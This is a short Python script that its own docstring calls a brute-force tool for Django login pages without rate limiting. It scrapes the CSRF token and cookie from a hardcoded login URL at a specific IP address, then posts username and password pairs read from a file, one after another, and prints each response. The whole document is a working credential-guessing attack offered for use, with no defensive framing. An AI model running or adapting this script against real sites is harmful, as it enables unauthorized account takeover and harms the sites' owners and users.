""" A script to brute force django apps with no rate-limiting. """
import sys
import requests
from bs4 import BeautifulSoup as BS
import re

URL = "http://207.154.218.171/accounts/login/"


def connect(url, data):
    # get middleware_token
    response = requests.get(URL)
    soup = BS(response.text, "html.parser")
    middleware_token = soup.find(
        "input", {"name": "csrfmiddlewaretoken"})["value"]
    if not middleware_token:
        print("error: csrf middleware token not extracted")
        return
    data["csrfmiddlewaretoken"] = middleware_token

    # get csrftoken
    token_matcher = re.compile(r"csrftoken=([^;]*);")
    csrf_line = response.headers["Set-Cookie"]
    matches = token_matcher.match(csrf_line)
    if not matches[1]:
        print("error: csrf token not extracted")
        return
    cookie = {"csrftoken": matches[1]}
    # print(cookie)

    # make request
    t = requests.post(URL, data=data, cookies=cookie)
    soup = BS(t.text)
    print(soup.get_text())

if __name__ == "__main__":
    m = {}
    with open('password.txt', 'r') as f:
        for line in f:
            m["username"] = line.split(" ")[0].strip()
            m["password"] = line.split(" ")[1].strip()
            connect(URL, m)
